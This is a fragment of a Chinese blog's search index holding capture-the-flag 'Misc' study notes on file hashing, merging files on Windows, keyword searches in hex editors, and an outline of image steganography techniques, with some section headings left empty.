class="line-numbers-rows"><span></span><span></span></span></code></pre><p>完整性检测：Linux下计算文件md5</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">md5sum 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-Windows下文件合并"><a href="#2-Windows下文件合并" class="headerlink" title="2.Windows下文件合并"></a>2.Windows下文件合并</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">copy <span class="token operator">/</span><span class="token constant">B</span> gif01<span class="token operator">+</span>gif02 <span class="token number">1.</span>gifcertutil <span class="token operator">-</span>hashfile 文件名 md5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将md5改为sha可查看文件sha码</p><h3 id="文件内容隐写"><a href="#文件内容隐写" class="headerlink" title="文件内容隐写"></a>文件内容隐写</h3><p>用010&#x2F;winhex&#x2F;notepad++ 直接搜索关键字flag或key等</p><h2 id="图片隐写术"><a href="#图片隐写术" class="headerlink" title="图片隐写术"></a>图片隐写术</h2><p>主要考点<br>1.细微的颜色差别<br>2.gif图多帧隐藏<br>3.exif信息隐藏<br>4.图片修复<br>5.最低有效位LSB隐写<br>6.图片加密</p><h3 id="1-firework"><a href="#1-firework" class="headerlink" title="1.firework"></a>1.firework</h3><p>使用16进制工具打开文件时发现文件头中有firework标识，通过firework工具找到隐藏图片</p><h2 id="压缩文件处理"><a href="#压缩文件处理" class="headerlink" title="压缩文件处理"></a>压缩文件处理</h2><h2 id="流量取证技术"><a href="#流量取证技术" class="headerlink" title="流量取证技术"></a>流量取证技术</h2>]]></content>
      
      
      <categories>
          
          <category> Misc学习整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Misc </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
